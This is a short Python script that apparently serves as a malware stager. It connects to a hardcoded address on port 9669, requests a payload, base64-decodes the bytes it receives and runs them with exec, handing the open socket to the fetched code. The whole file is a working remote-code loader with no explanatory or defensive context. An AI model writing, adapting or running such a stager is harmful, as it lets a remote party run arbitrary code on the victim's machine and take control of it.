#!/usr/bin/python
import socket, struct
import base64
s=socket.socket()
s.connect(('192.168.0.107',9669))
s.send("GiveMePayload")
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
exec(base64.b64decode(d),{'s':s})
